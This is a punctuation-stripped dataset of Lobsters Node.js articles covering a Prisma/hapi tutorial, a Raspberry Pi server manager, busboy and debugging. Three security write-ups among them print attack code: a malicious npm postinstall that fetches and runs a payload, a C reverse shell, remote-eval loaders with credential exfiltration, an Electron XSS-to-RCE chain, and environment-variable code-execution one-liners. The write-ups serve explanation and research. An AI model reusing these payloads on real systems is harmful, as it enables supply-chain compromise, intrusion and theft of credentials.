prismausercreate data firstname payloadfirstname lastname payloadlastname email payloademail social jsonstringify payloadsocial select id true return hresponse createduser code catch err consolelog err access prisma serverapp object assigned prisma plugin use request payload prismausercreate call save user databaseyou see red squiggly line line accessing payload property indicating type error nt see error run typescript compiler npm run compile error property firstname exist type string object buffer readable property firstname exist type string firstname payloadfirstname payload value determined runtime typescript compiler way knowing time fixed type assertion type assertion mechanism typescript allows override variable inferred type typescript type assertion purely telling compiler know type better hereto define interface expected payload interface userinput firstname string lastname string email string social facebook string twitter string github string website string note type interface many similarity typescript learn difference check articlethen add type assertion const payload requestpayload userinput plugin look follows const usersplugin name appusers dependency prisma register async function server hapiserver serverroute method post path user handler registerhandler export default usersplugin interface userinput firstname string lastname string email string social facebook string twitter string github string website string async function registerhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const payload requestpayload userinput try const createduser await prismausercreate data firstname payloadfirstname lastname payloadlastname email payloademail social jsonstringify payloadsocial select id true return hresponse createduser code catch err consolelog err adding validation create user routein step also add payload validation using joi ensure route handle request correct datavalidation thought runtime type check using typescript type check compiler performs bound known compile time since user api input known compiletime runtime validation help casesto import joi follows import joi hapijoi joi allows define validation rule creating joi validation object assigned route handler hapi know validate payloadin create user endpoint want validate user input fit type defined interface userinput firstname string lastname string email string social facebook string twitter string github string website string joi corresponding validation object would look follows const userinputvalidator joiobject firstname joistring required lastname joistring required email joistring email required social joiobject facebook joistring optional twitter joistring optional github joistring optional website joistring optional optional next configure route handler use validator object userinputvalidator add following route definition object method post path user handler registerhandler option validate payload userinputvalidator create test create user routein step create test verify create user logic test make request post user endpoint serverinject check response includes id field thereby verifying user created databasestart creating testsusersteststs file add following content import createserver srcserver import hapi hapihapi describe post user create user let server hapiserver beforeall async server await createserver afterall async await serverstop let userid test create user async const response await serverinject method post url user payload firstname testfirstname lastname testlastname email test datenow prismaio social twitter thisisalice website http wwwthisisalicecom expect responsestatuscode toequal userid jsonparse responsepayload id expect typeof userid number tobetruthy test injects request payload asserts statuscode id response numbernote test avoids unique constraint error ensuring email unique every test runnow written test happpy path creating user sucessfully write another test verify validation logic crafting another request invalid payload eg ommitting required field firstname follows test create user validation async const response await serverinject method post url user payload lastname testlastname email test datenow prismaio social twitter thisisalice website http wwwthisisalicecom consolelog responsepayload expect responsestatuscode toequal checkpoint run test npm test command verify test passdefining testing get user routein step first define test get user endpoint implement route handleras reminder get user endpoint get user userid signaturethe practice first writing test implementation often referred testdriven development testdriven development improve productivity providing fast mechanism verify correctness change work implementationdefining testfirst test route returning user foundopen userstestts file add following test test get user return non existant user async const response await serverinject method get url expect responsestatuscode toequal second test test happy path successfully retrieved user use userid variable set create user test created previous step ensure fetch existing user add following test test get user return user async const response await serverinject method get url user userid expect responsestatuscode toequal const user jsonparse responsepayload expect userid tobe userid since nt defined route yet running test result failing test next step define routedefining routego usersts user plugin add following route object serverroute call serverroute method get path user userid handler getuserhandler option validate params joiobject userid joinumber integer similar defined validation rule create user endpoint route definition validate userid url parameter ensure number passednext define getuserhandler function follows async function getuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const userid parseint requestparamsuserid try const user await prismauserfindone id userid user return hresponse code else return hresponse user code catch err consolelog err return boombadimplementation note calling findone prisma return null result could foundin handler userid parsed request parameter used prisma client query user found returned otherwise found user object returnedcheckpoint run test npm test verify test passeddefining testing delete user routein step define test delete user endpoint implement route handlerthe delete user endpoint delete user userid signaturedefining testfirst write test route parameter valdation add following test userstestts test delete user fails invalid userid parameter async const response await serverinject method delete url expect responsestatuscode toequal add another test delete user logic delete user created create user test test delete user async const response await serverinject method delete url user userid expect responsestatuscode toequal note status response code indicates request succeeded response contentdefining routego usersts user plugin add following route object serverroute call serverroute method delete path user userid handler deleteuserhandler option validate params joiobject userid joinumber integer defined route define deleteuserhandler follows async function deleteuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const userid parseint requestparamsuserid try await prismauserdelete id userid return hresponse code catch err consolelog err return hresponse code checkpoint run test npm test verify test passeddefining testing update user routein step define test update user endpoint implement route handlerthe update user endpoint put user userid signaturewriting test update user routefirst write test route parameter valdation add following test userstestts test update user fails invalid userid parameter async const response await serverinject method put url expect responsestatuscode toequal add another test update user endpoint update user firstnameand lastname field user created create user test test update user async const updatedfirstname testfirstnameupdated const updatedlastname testlastnameupdated const response await serverinject method put url user userid payload firstname updatedfirstname lastname updatedlastname expect responsestatuscode toequal const user jsonparse responsepayload expect userfirstname toequal updatedfirstname expect userlastname toequal updatedlastname defining update user validation rulesin step define update user route term validation endpoint payload require specific field unlike create user endpoint email firstname lastname required allow use endpoint update single field eg firstnameto define payload validation could use userinputvalidator joi object however recall field required const userinputvalidator joiobject firstname joistring required lastname joistring required email joistring email required social joiobject facebook joistring optional twitter joistring optional github joistring optional website joistring optional optional update user endpoint field optional joi provides way create different alteration joi object using tailor alter method especially useful defining create update route similar validation rule keeping code dryupdate already defined userinputvalidator follows const userinputvalidator joiobject firstname joistring alter create schema schemarequired update schema schemaoptional lastname joistring alter create schema schemarequired update schema schemaoptional email joistring email alter create schema schemarequired update schema schemaoptional social joiobject facebook joistring optional twitter joistring optional github joistring optional website joistring optional optional const createuservalidator userinputvalidatortailor create const updateuservalidator userinputvalidatortailor update updating create user route payload validationnow update create user route definition use createuservalidator srcpluginsusersts user plugin method post path user handler createuserhandler option validate payload userinputvalidator payload createuservalidator defining update user routewith validation object update defined define update user route go srcpluginsusersts user plugin add following route object serverroute call serverroute method put path user userid handler updateuserhandler option validate params joiobject userid joinumber integer payload createuservalidator defined route define updateuserhandler function follows async function updateuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const userid parseint requestparamsuserid const payload requestpayload partial userinput try const updateduser await prismauserupdate id userid data payload return hresponse updateduser code catch err consolelog err return hresponse code checkpoint run test npm test verify test passedsummary next stepsif made far congratulation article covered lot ground starting rest concept going hapi concept route plugins plugin dependency testing validationyou implemented prisma plugin hapi making prisma available throughout application implemented route make use itmoreover typescript helped autocompletion verifying correct use type sync database schema throughout applicationthe article covered implementation subset endpoint next step could implement route following principlesyou find full source code backend githubthe focus article implementing rest api however concept validation testing apply situation toowhile prisma aim make working relational database easy helpful deeper understanding underlying databasecheck prisma data guide learn database work choose right one use database application full potentialin next part series learn authentication implementing passwordless authentication email jwtcontinues integration building github action pipeline automate testing backendintegration external apis using transactional email api send emailsauthorization provide different level access different resourcesdeployment
27,Lobsters,nodejs,Node.js programming,The Anatomy of a Malicious Package,https://blog.phylum.io/malicious-javascript-code-in-npm-malware/,anatomy malicious package,attacker motivation mentality onhost actually observed javascript malware run crawl identification might end nearly impossible walk malware added upstream add backdoor go next,malicious package actually look like practice walk hypothetical exercise see malware generally work sort function might expect relatively simple temporary complex additionally focused primarily javascript post really need think two different threat model inbrowser malware look like going differ onhost malware primary attack method could attacker feasibly accomplish level access malware historically done context end actually split series article first post begin examine onhost javascript malware look like followed indepth look make malware stealthier resistant removal finally last set post delve browserbased malware accomplish within browser sandboxattacker motivation mentalityas begin thought experiment first thing consider potential attacker target goal would focus npm specifically article primarily give good survey several platform inbrowser v onsystem differing threat model general process methodology concern remain across platform language ecosystemsonhostthe whole concept onhost malware npm package seems bit unintuitive first blush immediate association generally browserfocused concern must safe since run browser sandbox reality however onhost actually observed javascript malware run interestingly enough serious advantage attacker perspective running rather end user web browser run outside browser level access developer installing packagerunning within large mainstream package enduser browser increase odds discovered many product user observing package behavior endpoint build processto add last point many security product actually ignore thing like devdependencies entirely many infrastructure piece ci builder buildrelated code run littletonothing term security measure mitigationswhile certainly nt mean restricted operating onhost see later plenty inbrowser make compelling place begin journey walk iterative process making badware package applying gradual improvementscrawlto start project build simple npm package exactly value provide largely irrelevant argument sake might change console font color include picture cat practice simply exists bundle malwarein order malware even moderately successful need three element gain executionnetwork accessto ensure user remains unaware runningto get might consider basic form item one take page prior work leverage great feature javascript tooling postinstall script end start packagejson name mostlyharmless version script postinstall wget http probablybadmalware chmod x malware malware least wo nt make malware complex perhaps simply start something like following include systypesh include syssocketh include netinetinh include arpaineth include sysstath include syswaith include errnoh include fcntlh include unistdh include stdlibh include stdioh include stringh int main int argc char argv struct sockaddrin addr unsigned short port const char netaddr int sock addrsinfamily afinet addrsinport htons port inetaton netaddr addrsinaddr return sock socket afinet sockstream return connect sock struct sockaddr addr sizeof addr goto cleanup sock stdoutfileno goto cleanup sock stdinfileno goto cleanup sock stderrfileno goto cleanup execlp binbash bash null cleanup close sock return simple reverse shella small program essentially give u reverse shell first opening socket connecting remote server redirecting stdinstdoutstderr new socket executing bash full console access local machine context current user presumably either developer ci runner certainly work give u access come serious limitation one fairly trivial detect simple netstat identify easily another issue ready accept connection soon user run npm install try connect die current user log barring detached terminal similar finally overt would network security device id ip catch traffic inflight even casual observer would find perusing packagejson oddly enough however last point least regarding packagejson le bad one might think trivial observation would certainly catch malware upstream nontrivial package installation manual identification might end nearly impossible fact documented backstabber knife collection linked earlier article sort scheme worked large subset discovered javascript malware still almost certainly betterwalk notional infection vector via postinstall script code give u access remote host go look improving setup draw inspiration malware added upstream eslint harvested shipped token credential local system effectively giving attacker ability modify previouslypublished package controlled current user future datewhile actually obtaining credential focusing single file small number credential may may machine land seems bit lackluster look locally stored credential eg aws token ssh key etc environment variablesin order get new functionality running start making quick change previous packagejson name mostlyharmless version script postinstall node libbuildjs instead running new malware directly file make slightly stealthier remotehosting file pulling runtime quick first pas might resemble following try const http require http httpsget hostname probablybad path newmalware header accept texthtml re reson data eval error catch e interestingly enough actually almost exactly malware launched aforementioned eslint attack would pull file retrieval script remote host slotted hypothetical attack domain probablybad original utilized pastebin simply eval text mostly effective critical flaw reason nt get entire script execute first chunk eval likely fail syntax error might attempting execute half script reference copy original malware deeper explanation attack constituent part found ended resulting attack discovered quickly certainly first issue relatively simple fix need ensure downloaded full file attempt eval end probably want something like following try const http require http httpsget http probablybadnewmalware re let tmp reson data tmp reson end eval tmp error catch e get u consistent execution least think harvesting npm cred crypto wallet really best think bit two general context run developer systemon ci runnerfrom attacker perspective place interesting albeit slightly different reason first case answer somewhat obvious going running developer workstation project built tested locally mean thing like credential npm cred ssh key many likely available access exfiltration among thing second scenario however also interesting ci runner often get sensitive item database credential infrastructure key similar injected build process past experience also show attacker historically used opportunity add backdoor stage infecting project system realistically enumerating file environment variable give attacker providing proverbial key kingdom term access instead simply accessing single file user home directory one lingering concern however linked malware essentially provided extracted credential part get remote server exfiltration method mostly worked case due simply fact data retrieving relatively small least approximating fixedlength u quickly run issue seeminglysmall change transitioned extracting small fixedlength file sending back potentially many megabyte data spread number file environment variable various type encoding order fix allow u slightly stealthier could spend lot time thinking improve thing beyond scope article really need normalize encoding ensure sending much data time push content back remote server end start following snippet code contain temporary data read file env var let exfil essentially call function per item name filename env var tp either file env data raw blob data const process name tp data exfil objectassign exfil name tp bufferfrom data tostring processed data exfiltration easily iterate object send back namecontent pair variety endpoint perhaps alternating get post least variety action wanted even stealthier might combine together encrypt content send back variable sized chunkswhere go nextwe discussed quite bit depth bare minimum required bake malware upstream library however simply beginning discussion many part handling persistence run user log system extending tooling probably want little better first effort improving stealthiness working around limitation platform additional item consider short technically met stated goal first step toward building malicious package still much room improvement especially noting tactic technique procedure ttps described nearly exhibited live malware much rapidly convicted want push boundary bit discus sophisticated technique dig much topic followon post
28,Lobsters,nodejs,Node.js programming,Pilo: Raspberry Pi Powered Lights-Out Remote Server Management for $60 or less,https://zach.bloomqu.ist/blog/2020/08/pilo-raspberry-pi-lights-out-management.html,pilo raspberry pi powered lightsout remote server management le,lightsout management lom ipmi building keyboard controller using raspberry pi zero usb host pihole bitbang many many read short program power control via capturing video output amazon creating application download video instead github repo pilo cypress github action workflow packaging pilo soldered underside tutorial part list microcenter amazon amazon setup snugly myriad reason,completed pilo controller final installation usb capture card arduino nano usb serial soldered underside like many geek home server made offtheshelf consumergrade pc part run weekend programming project game server friend website recently power event house caused server reboot power came back server booted stuck boot screen waiting enter disk decryption passphrase luckily home asleep time woke realized something amiss able plug keyboard enter passphrase event got thinking home time another country someday move server outside house need regularly access physical screen keyboard real server world solution known lightsout management lom every major server manufacturer flavor hp ilo integrated lightsout even industry standard like ipmi define common interface lom implementation commonly supported function lom system include controlling keyboard mouse input controlling power button status restart shutdown force seeing raw video output motherboard even preboot even bios mounting isos disk decided make raspberry pibased lom thing help decrease stress next time leave house extended period time like introduce pilo pi lightsout note post describes arrived final design system want instruction setting start reading tutorial building keyboard controller started looking way use pi send keyboard command computer problem discovered existing method rely using raspberry pi zero usb host disables using onboard usb port purpose additionally method work board like raspberry pi problematic wanted use due onboard ethernet fact one kicking around previous pihole deployment suitable solution would emulate keyboard via gpio pin pi would theoretically affect existing usb device could used model pi pi zero started looked trying bitbang usb human interface device protocol via pi gpio pin pretty quickly hit dead end many many existing discussion web bitbanging usb protocol pi consensus seems raspberry pi gpio slow emulate usb even could output bit fast enough act usb device implementation would extremely buggy nonrealtime nature linux o read usb way send keypresses computer almost decade usb standard twinkle compaq eye ibm using standard confused connect mouse keyboard pc still feasible use pi bitbang protocol use arduino daughterboard library handle nittygritty serial protocol arduino nano pictured left plugged directly combo port back motherboard ignore unused wire red originally planned cutting end cable making nice goodwill near junk turn breadboard wire fit ohsosnugly din hole gon na arduino nano flashed short program make act dumb pipe blindly shuttle byte arduino usb serial port connection motherboard mean logic keyboard command sent written piside nice mean never reflash arduino update keyboard logic note currently pilo built control keyboard input since oriented towards server use would possible add mouse output additional hardware wire mouse clk data gnd unless using combo port library contains function mouse control well power control via originally thought going wire relay motherboard reset pin allow pilo control computer power approach diyipmi another similar project us however researching keyboard controller rediscovered longlost secret standard acpi key acpi advanced configuration power interface set power management standard pc standard define power wakeup sleep key scancodes used control power status pc like power button front box shortpress power key request o shutdown however motherboard longpress power seem force power almost bios support using acpi key power system powered state option look like bios acpi poweredoff state known option enabled sending power scancode boot computer state arduino two responsibility pilo send regular keypresses computer send power command computer save u install relay motherboard reset pin capturing video output server gpu hdmi output decided use usb hdmi capture card get video feed pilo found one amazon connected pi act regular usb webcam available devvideox project experience streaming video web decided use userspace component set http video server make easy set simple mjpeg stream goofiest possible video stream frame stream full jpeg image sent real time imagine lightest bandwidth easy embed web browser support embedding img tag img src streammjpeg configured listen localhost idea could reverseproxy connection video stream provide security creating application pilo interface decided go web app instead something like vnc actual ipmi protocol mostly due background web development fact app accessed web browser something every computer installed short video showing completed pilo app action browser nt support webms download video instead find github repo pilo consists two major component frontend us vanilla htmlcssjs display interface translate keypresses communicate server via websockets server http server written nodejs authenticates request using http basic auth communicates keyboard controller via serialport library manages reverseproxying video stream also endtoend test folder use cypress test application real web browser run firefox chrome every commit ci via github action workflow readme contains information building testing project interested contributing built package also published npm production use packaging pilo one goal building pilo make small enough fit inside server case check photo see fit left server case embedding pilo right server case embedding pilo hdmi ethernet microusb power routed leftmost pcie slot routed io shield topright pilo sits atop ledge bottomright image picture final assembly made outer photo pi usb device soldered underside save space inset photo final package taped ready install cable coming hot glue tape make solderer completed package fit within bounding box slightly larger pi x x mean pilo fit conveniently standard hard drive bay tutorial part list raspberry pi microcenter everywhere else micro linux computer even pi zero could work using wifi need usb hub arduino serial set arduino serial via gpio arduino nano amazon arduino would work well need clk data output converted since serial connection expects usb hdmi capture card compatible card amazon optional plug make tidy connection supply wire soldering iron need solder microsd card microusb power supply come roughly buy everything cheapest lucky enough live near microcenter setup getting started make sure device ready debianbased o like raspbian dietpi installed pi microsd card flash program arduino nano connect everything according beautiful wiring diagram ethernet raspi usb power power usb usb plug hdmi capture card server hdmi keyboard port data arduino nano clk gnd connect data clk gnd arduino nano directly respective pin keyboard port motherboard consult internet reference pinout dress scavenging spare pigtail stripping end breadboard wire also fit snugly din port turn server connecting disconnecting anything tofrom port port designed hotplugging mind risk damaging component o likely detect hotplugged device bother connect pin port vin arduino bad idea myriad reason set mjpeg streaming server usb hdmi capture card follow instruction website install apt source note debian buster user apt repo buster yet stretch repo seem work fine buster update apt index install required package apt update apt install retrieve usb hdmi capture card id running lsusb hexadecimal string like start server listening substituting device id driver uvc deviceid autovideonr serveroption serveroption able access mjpeg stream usb hdmi capture card locally pi http able access network since bound localhost bindhostaddress set command run every boot example adding etcrclocal time generate auth credential follow algorithm think secure username password example foo bar join colon example foo bar result example authsha install nodejs npm install latest distribution pilo npm npm install global pilo may need pas unsafeperms installing root start pilo port running command authsha set environment variable pilo able access pilo http yourpiip using username password created earlier add command etcrclocal run boot
29,Lobsters,nodejs,Node.js programming,Terminate busboy from reading more request with unpipe() and work queue,https://bytearcher.com/articles/terminate-busboy/,terminate busboy reading request unpipe work queue,wrap common error handling code prevent data fed busboy unpipe prevent already piped data busboy internal buffer firing event pqueue,busboy goto library efficiently reading multipartformdata file upload request instead writing intermediate file disk buffering memory busboy us stream give access file data arrives use stream write resilient app offloads file nodejs server external file storage server like aws easy setup busboy start reading incoming request little trickier terminate busboy prevent reading request might need prematurely terminate processing case internal error happens app notice received data invalid want send http response soon possible waste resource processing request setup busboy code like const busboy require busboy const express require express const router new expressrouter routerpost req re next const busboy new busboy header reqheaders busboyon field name value busboyon file name stream filename encoding contenttype busboyon finish reqpipe busboy cancel processing need two step need prevent data fed request busboy calling unpipe need prevent event firing based already piped data stored busboy internal buffer routing handler work queue pause wrap common error handling code first need place put error handling code wrap field file finish event handler trycatch logic placed error handling function case error delegate error expressjs builtin error handler calling next e get code like async function handleerror fn try await fn catch e next e busboyon field name value handleerror busboyon file name stream filename encoding contenttype handleerror busboyon finish handleerror prevent data fed busboy unpipe case error happens stop feeding incoming request busboy calling unpipe previously pipe request object async function handleerror fn try await fn catch e requnpipe busboy next e prevent already piped data busboy internal buffer firing event busboy wo nt receive piece incoming request stream work chunk kb data may already piped data stored busboy internal buffer contains unprocessed field file especially case uploaded file small need prevent previously piped data causing field file event handler fired routing work done event handler work queue case error stop work queue processing work thus stop event processed use pqueue package work queue implementation setting concurrency ensures one event processed time giving u result want const busboy require busboy const express require express const pqueue require pqueue const router new expressrouter routerpost req re next const busboy new busboy header reqheaders const workqueue new pqueue concurrency async function handleerror fn workqueueadd async try await fn catch e requnpipe busboy workqueuepause next e busboyon field name value handleerror busboyon file name stream filename encoding contenttype handleerror busboyon finish handleerror reqpipe busboy case error happens pause work queue processing already queued event unprocessed event lurking internal buffer prematurely terminate busboy processing incoming request respond swiftly caller related article
30,Lobsters,nodejs,Node.js programming,Automatically Generated Posters of Chess Games,https://checkmateposters.com/,automatically generated poster chess game,sample,sample click sample view editor
31,Lobsters,nodejs,Node.js programming,Open Sesame: Escalating Open Redirect to RCE with Electron Code Review,https://spaceraccoon.dev/open-sesame-escalating-open-redirect-to-rce-with-electron-code-review,open sesame escalating open redirect rce electron code review,node world live webpack exploder electron builtin chromium devtools recommends packaging application asar archive one x away popping calc whitebox exploit discovering vulnerable config classic electron calc payload attempting x pwned bypassing csp electron keyboard shortcut module intigriti easter x challenge room ment boilerplate code electron documentation mentioned previously driveby code execution world live,node world live better worse nodejs rocketed developer popularity chart thanks framework like react react native electron developer easily build client mobile native platform client delivered essentially thin wrapper around single javascript file modern convenience tradeoff security side thing moving routing templating logic client side make easier attacker discover unused api endpoint unobfuscated secret check webpack exploder tool wrote decompiles webpacked react application original source code native desktop application electron application even easier decompile debug instead wading heap assembly code attacker use electron builtin chromium devtools meanwhile electron documentation recommends packaging application asar archive tarlike format unpacked simple oneliner source code attacker search clientside vulnerability escalate code execution funky buffer overflow needed electron nodeintegration setting put application one x away popping calc danger x electron app demonstrated jasmin landry love whitebox approach testing application know looking zoom weak point follow exploit pass code blog post go whitebox review unnamed electron application bug bounty program demonstrate escalated open redirect remote code execution help debugging code sample modified anonymized whitebox exploit journey began one day spotted jasmin tweet inspired electron hacking began installing application macos retrieved source code browse application folder rightclick application select show package content enter content directory contains appasar file run npx asar extract appasar source node installed view decompiled source code new source directory discovering vulnerable config peeking packagejson found configuration main appindexjs telling main process initiated indexjs file quick check indexjs confirmed nodeintegration set true browserwindow instance meant could easily escalate attackercontrolled javascript native code execution nodeintegration true javascript window access native nodejs function require thus import dangerous module like childprocess lead classic electron calc payload require childprocess execfile applicationscalculatorappcontentsmacoscalculator function attempting x find x vector application crossplatform collaboration tool think slack zoom plenty input like text message shared uploads launched app source code electron proxying web traffic burp suite began testing html payload like b pwned b input long got first pwned promising sign however standard x payload like script alert script svg onloadalert simply failed execute needed start debugging bypassing csp default access devtools electron application keyboard shortcut ctrlshifti key mashed key nothing happened appeared application removed default keyboard shortcut solve mystery searched globalshortcut electron keyboard shortcut module source code one result popped electronglobalshortcutregister commandorcontrolh activatedevmenu aha application custom keyboard shortcut open secret menu entered cmdh developer menu appeared menu bar contained number juicy item like update callback importantly devtools opened devtools resumed testing x payload soon became clear failing error message popped devtools console complaining content security policy csp violation application loading url following csp contentsecuritypolicy scriptsrc self unsafeeval http cdnheapanalyticscom http heapanalyticscom http http fastappcuescom http firebaseiocom csp excluded unsafeinline policy blocking event handler like svg payload furthermore since payload injected dynamically page using javascript typical script tag failed execute fortunately csp one fatal error allowed wildcard url particular http policy allowed include script bucket inject execute script tag dynamically used trick learned intigriti easter x challenge used iframe srcdoc attribute iframe srcdoc script srchttps script iframe anonymized source url got lovely alert box adrenaline pumping modified evilscriptjs windowrequire childprocess execfile applicationscalculatorappcontentsmacoscalculator function resent x payload nothing need go deeper room requirement heading back devtools console noticed following error uncaught typeerror windowrequire function perplexing nodeintegration set true nodejs function like require included window going back source code noticed line code creating vulnerable browserwindow const appwindow createwindow main width height webpreferences nodeintegration true preload pathjoin dirname preloadjs looking preloadjs windownoderequire require delete windowrequire delete windowexports delete windowmodule aha application renamingdeleting require preload sequence nt attempt security obscurity boilerplate code electron documentation order get third party javascript library like angularjs work mentioned previously insecure configuration consistent theme among vulnerable application turning nodeintegration reintroducing require window code execution becomes singificant possibility one tweak using windowparentnoderequire since executing x iframe sent new payload got calc driveby code execution looked native application found open redirect web application page http collabapplicationcomredirectjsp nextevilcom however triager asked demonstrate additional impact one feature native application able open new window web link browser consider application like slack zoom ever wondered open link say zoomus prompted open zoom application website trying open custom url scheme registered native application example zoom register zoommtg custom url scheme operating system zoom installed try open zoommtg zoomusstart pwdxxxx browser try prompted open native application lesssecure browser wo nt even prompted noticed vulnerable application similar function would open collaboration room native application visited page website digging code found handler function iswhitelisteddomain url var allowed collabapplicationcom var test extractdomain url allowedindexof test return true return false let launchurl parselaunchurl fullurl iswhitelisteddomain launchurl appwindowloadurl launchurl else appwindowloadurl homeurl let break native application launched custom url scheme case collabapp collabapplicationcom pwdabc url passed launch handler launch handler extract url collabapp check domain extracted url collabapplicationcom load url application window pass check whitelist checking code correct security mechanism incredibly fragile long single open redirect collabapplicationcom could force native application load arbitrary url application window combine nodeintegration vulnerability need redirect evil page call windowparentnoderequire get code execution final payload follows collabapp collabapplicationcomredirectjsp next evilhtml simply ran windowparentnoderequire childprocess execfile applicationscalculatorappcontentsmacoscalculator function victim user visit webpage load evil custom url scheme calculator pop driveby code execution without browser zerodays world live new application flourish wake pandemic developer might tempted take shortcut could lead devastating security hole vulnerability fixed quickly caused mistake early development cycle think back nodeintegration preload issue vulnerable application application always remain brittle vulnerable unless architectural configuration issue fixed even patch one x open redirect new instance bug lead code execution time turning nodeintegration would break entire application need rewritten point onwards nodejs framework like electron allow developer rapidly build native application using language tool familiar however userland vastly different threat landscape popping alert browser different popping calc application developer user tread carefully
32,Lobsters,nodejs,Node.js programming,WarsawJS Meetup #72 Online,https://www.meetup.com/WarsawJS/events/267830160/,warsawjs meetup online,,
33,Lobsters,nodejs,Node.js programming,Let's Debug a Node.js Application,https://blog.heroku.com/debug-node-applications,let debug nodejs application,listen article rely complicated cli tooling analyze core dump pino winston chrome devtools ability inspect memory take heap snapshot creating logpoints nodejs guide inspector client ndb llnode video debug trace clarify video recording julianduque,listen article always challenge come debugging application nodejs asynchronous workflow add extra layer complexity arduous process although update made engine order easily access asynchronous stack trace time get error main thread application make debugging little bit difficult well nodejs application crash usually need rely complicated cli tooling analyze core dump article take look easier way debug nodejs application course developer toolkit complete without logging tend place consolelog statement code local development really scalable strategy production would likely need filtering cleanup implement consistent logging strategy order identify important information genuine error instead implement proper logoriented debugging strategy use logging tool like pino winston allow set log level info warn error allowing print verbose log message locally severe one production also stream log aggregator endpoint like logstash papertrail even slack logging take u far understanding application working way would expect sophisticated debugging session want use breakpoints inspect code behaves moment executed use node inspect node inspect debugging tool come nodejs actually implementation chrome devtools program letting add breakpoints control stepbystep execution view variable follow call stack couple way launch node inspect easiest perhaps call nodejs application inspectbrk flag node inspectbrk yourscriptname launching program head chrome inspect url chrome browser get chrome devtools chrome devtools capability normally expect debugging javascript browser one nicer tool ability inspect memory take heap snapshot profile memory usage understand memory allocated potentially plug memory leak rather launching program certain way many modern ides also support debugging node application addition many feature found chrome devtools bring feature creating logpoints allowing create multiple debugging profile check nodejs guide inspector client information ides another option install ndb standalone debugger nodejs make use devtools available browser isolated local debugger also extra feature nt available devtools support editinplace mean make change code updated logic supported directly debugger platform useful quick iteration suppose application crash due catastrophic error like memory access error may rare happen particularly app relies native code investigate sort issue use llnode program crash llnode used inspect javascript stack frame object mapping object cc side order use first need core dump program need use processabort instead processexit shut process code use processabort node process generates core dump file exit better understand llnode provide video demonstrates capability aside also thirdparty package recommend debugging first called simply enough debug debug assign specific namespace log message based function name entire module selectively choose message printed console via specific environment variable example nodejs server logging several message entire application middleware stack like sequelize express application express router set debug environment variable express router start program message tagged express router shown filtering message way hone single segment application behaving without needing drastically change logging code two module go together trace clarify trace augments asynchronous stack trace providing much detailed information async method called roadmap nodejs provide default clarify help removing information stack trace specific nodejs internals allows concentrate function call specific application neither module recommended running production enable debugging issue local development environment like follow along use debugging tool practice video recording provides detail includes live demo narrow problem code question find twitter julianduque
34,Lobsters,nodejs,Node.js programming,Hacking with Environment Variables,https://www.elttam.com/blog/env/,hacking environment variable,introduction remote ldpreload exploitation perl exploit hacker fantastic blasty exploit solve ctf challenge justinsteven proof concept python making progress pythonwarnings guarded check variable antigravity module easter egg leveraging perl arbitrary code execution proof concept nodejs blog post michał bentkowski proc filesystem proof concept php php setting orange tsai great blog post brendan scarvell proof concept ruby proof concept conclusion,introduction recent project gained ability specify environment variable process executed also unable control content file disk bruteforcing process identifier pid file descriptor found interesting result eliminating remote ldpreload exploitation fortunately scripting language interpreter executed enabled u execute arbitrary command specifying particular environment variable blog post discus arbitrary command executed range scripting language interpreter supplied malicious environment variable perl quick read environment section perlrun man page reveals plenty environment variable worth investigating environment variable allows specifying commandline option restricted accepting option cdimtuwdmtw unfortunately mean e allows supplying perl code run lost though demonstrated exploit hacker fantastic exploit writes malicious perl module tmprootpm supply environment variable achieve arbitrary code execution however exploit local privilege escalation vulnerability generic technique ideally require access file system looking blasty exploit cve exploit require creating file used environment variable sh exit environment variable also used solve ctf challenge one final nicety generic technique would use single environment variable instead two justinsteven found possible leveraging either used load perl module option allows adding extra code module name proof concept arbitrary code execution achieved using environment variable perl running empty script devnull docker run env print id perl devnull root root root python reading environment variable section python man page pythonstartup initially appears like may piece straightforward solution allows specifying path python script executed prior displaying prompt interactive mode interactive mode requirement seem like would issue pythoninspect environment variable used enter interactive mode specifying command line however documentation option explains pythonstartup used python started script execute mean pythonstartup pythoninspect combined pythonstartup effect python repl immediately launched ultimately mean pythonstartup viable effect executing regular python script environment variable looked promising pythonhome pythonpath let gain arbitrary code execution require also able create directory file filesystem may possible loosen requirement use proc filesystem andor zip file majority remaining environment variable simply checked contain nonempty string toggle generally benign setting one rare exception pythonwarnings making progress pythonwarnings documentation pythonwarnings state equivalent specifying w option w option used warning control specify warning often printed full form argument action message category module line warning control seem like promising lead quickly changed checking implementation def getcategory category category return warning category import builtins klass category else module klass categoryrpartition try import module none none klass except importerror raise optionerror invalid module name r module none code show long specified category contains dot trigger import arbitrary python module next problem vast majority module python standard library run little code imported tend define class used later even provide code run code typically guarded check main variable detect file imported run directly unexpected exception antigravity module python developer included easter egg triggered running import antigravity import immediately open browser xkcd comic joked import antigravity python would grant ability fly antigravity module open browser us another module standard library called webbrowser module check path large variety browser including mosaic opera skipstone konqueror chrome chromium firefox link elinks lynx also accepts environment variable browser let specify process executed possible supply argument process environment variable xkcd comic url one hardcoded argument command ability turn arbitrary code execution depends executables available system leveraging perl arbitrary code execution one approach leverage perl commonly installed system even available standard python docker image however perl binary used first argument xkcd comic url comic url argument cause error process exit without environment variable used effect url passed perl docker run e print id exit perl http ca nt open perl script http file directory fortunately perl available also common default perl script available perldoc perlthanks script also error exit invalid argument error case happens later processing environment variable mean leverage perl environment variable payload detailed earlier blog post working intended perldoc perlthanks docker run e print id exit perldoc http root root root run e print id exit perlthanks http root root root proof concept arbitrary code execution achieved using multiple environment variable python python docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx docker run e e browserperlthanks e print id exit python devnull root root root invalid w option ignored unknown warning category antigravityx nodejs blog post michał bentkowski provided payload exploiting kibana prototype pollution vulnerability used set arbitrary environment variable resulted arbitrary command execution michał payload used nodeoptions environment variable proc filesystem specifically procselfenviron although michał technique creative worked perfectly vulnerability technique always guaranteed work constraint would nice remove first constraint using procselfenviron viable content made syntactically valid javascript requires able create environment variable appear first content procselfenviron knowingbruteforcing environment variable name appear first overwriting value another constraint first environment variable value finish single line comment therefore newline character environment variable likely cause syntax error prevent payload executing use multiline comment fix issue must closed syntactically valid therefore rare case environment variable contains newline character required knowbruteforce environment variable name overwrite value new value contain newline removing contraints exercise left reader proof concept achieving arbitrary code execution environment variable nodejs michał bentkowski docker run e nodeversionconsolelog require childprocess execsync id tostring e nodeoptions require procselfenviron node devnull root root root php run ltrace e getenv php devnull find php us phprc environment variable environment variable used attempting find load configuration file phpini exploit 